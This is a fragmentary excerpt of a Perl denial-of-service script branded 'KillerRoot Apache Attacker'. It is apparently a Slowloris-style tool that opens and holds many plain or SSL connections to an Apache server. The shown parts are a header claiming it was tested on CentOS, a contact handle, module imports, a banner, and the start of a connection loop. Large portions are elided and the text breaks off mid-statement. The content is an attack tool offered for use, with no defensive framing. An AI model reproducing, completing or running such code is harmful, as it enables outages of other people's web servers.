...
# Tested on: CentOs
#feel free to contact us Killer@Root
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
...
Welcome to KillerRoot Apache Attacker
PRINT COMMANDS EDITED BY !B
EOTEXT
...
sub doconnections {
    ...
    while (1) {
        $failedconnections = 0;
        print "\t\t[XENON] PANDORA'S BOX OPENED!\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
